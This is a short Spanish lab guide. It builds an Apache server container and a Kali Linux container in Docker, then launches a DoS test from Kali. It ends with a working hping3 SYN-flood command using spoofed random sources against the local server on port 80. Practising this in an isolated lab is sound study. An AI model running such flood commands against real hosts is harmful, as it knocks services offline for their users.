# Ubuntu
En una terminal con docker se ejecutaran los siguientes comandos
## Crear contenedor de Ubuntu 
docker run -dit --name servidor-apache-prueba -p 80:80 ubuntu

## Ejecutar instancia de Ubuntu
docker exec -it servidor-apache-prueba bash

## Actualizar sistema Ubuntu
apt update -y && apt upgrade -y

## Dentro de la instancia de ubuntu instalar apache server
apt install -y apache2

## Cargar mensaje a la pagina web de apache server
echo "Hola, soy un servidor con apache server, si ves este mensaje el servidor esta activo" > /var/www/html/index.html

## Iniciar servicio de apache
service apache2 start

## En el navegador local ingresa a la pagina web del servidor de apache
htttp://localhost:80

# Kali Linux
En una terminal distinta con docker ejecutar los siguientes comandos para montar nuestro contenedor de Kali Linux para realizar las pruebas.

## Crear contenedor con Kali Linux
docker run -dit --name kali-testing kalilinux/kali-rolling

## Ejecutar instancia de Kali Linux
docker exec -it kali-testing bash

## Actualizar el sistema de Kali
apt update -y && apt upgrade -y

## Instalar dependencias necesarias para el ataque DDoS (Apache Benchmark, Hping3, Slowloris)
apt install -y hping3 slowloris apache2-utils

# Iniciando el ataque al IP y puerto del servidor de apache
## Ataque de inundacion TCP aleatoria
hping3 -S --flood --rand-source -p 80 172.17.0.2
